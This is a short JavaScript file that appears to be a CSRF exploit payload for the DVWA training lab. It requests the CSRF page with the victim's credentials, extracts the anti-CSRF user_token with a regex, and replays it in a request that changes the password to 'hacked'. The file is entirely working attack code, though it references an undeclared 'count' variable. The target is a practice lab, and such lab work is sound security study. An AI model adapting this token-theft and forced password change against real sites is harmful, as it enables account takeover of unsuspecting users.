var theUrl = 'http://localhost/DVWA/vulnerabilities/csrf/';
var pass = 'admin';
if (window.XMLHttpRequest){
    xmlhttp=new XMLHttpRequest();
}else{
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}
xmlhttp.withCredentials = true;
var hacked = false;
xmlhttp.onreadystatechange=function(){
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        var text = xmlhttp.responseText;
        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
        var match = text.match(regex);
        var token = match[1];
        var new_url = 'http://localhost/DVWA/vulnerabilities/csrf/?user_token='+token+'&password_new=hacked&password_conf=hacked&Change=Change'
        if(!hacked){
            alert('Got token:' + match[1]);
            hacked = true;
            xmlhttp.open("GET", new_url, false );
            xmlhttp.send();
        }
        count++;
    }
};
xmlhttp.open("GET", theUrl, false );
xmlhttp.send();
